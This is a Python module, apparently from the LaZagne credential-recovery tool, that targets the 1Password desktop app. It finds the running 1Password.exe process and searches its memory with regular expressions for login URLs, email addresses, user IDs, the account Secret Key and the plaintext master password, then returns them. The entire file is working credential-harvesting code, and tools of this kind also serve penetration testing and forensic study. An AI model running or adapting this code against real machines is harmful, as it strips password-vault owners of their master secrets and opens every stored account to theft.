from lazagne.config.lib.memorpy import Process, MemWorker
from lazagne.config.module_info import ModuleInfo


class OnePassword(ModuleInfo):

    def __init__(self):
        ModuleInfo.__init__(self, "1Password", 'memory')

    def run(self):
        pwd_found = []

        for process in Process.list():
            if process.get('name') == '1Password.exe':
                mw = MemWorker(pid=process.get('pid'))

                # Search for Account Details
                account_details = r'{"title":".*","url":"(.*)","ainfo":"(.*)","ps":.*,"pbe":.*,' \
                                  '"pgrng":.*,"URLs":\[{"l":".*","u":"(.*)"}\],"b5UserUUID":"(.*)",' \
                                  '"tags":\[.*\]}'

                for _, v in mw.mem_search(account_details, ftype='groups'):
                    pwd_found.append({
                        "Process": str(process),
                        'Login URL': str(v[0]),
                        'Email': str(v[1]),
                        'User ID': str(v[3]),
                    })

                # Search for Secret Key
                secret_key = '{"name":"account-key","value":"(.{2}-.{6}-.{6}-.{5}-.{5}-.{5}-.{5})","type":"T"}'
                for _, v in mw.mem_search(secret_key, ftype='groups'):
                    pwd_found.append({
                        'Process': str(process),
                        'Account Key': str(v[0])
                    })

                # Search for Master Password
                master_password = '{"name":"master-password","value":"(.*)","type":"P","designation":"password"}'
                junk = '","type":"P","designation":"password"}'

                for _, v in mw.mem_search(master_password, ftype='groups'):
                    v = v[0]  # Remove Tuple

                    if junk in v:  # Hacky way of fixing weird regex bug ?!
                        v = v.split(junk)[0]

                    pwd_found.append({
                        'Process': str(process),
                        'Master Password': str(v)
                    })

        return pwd_found
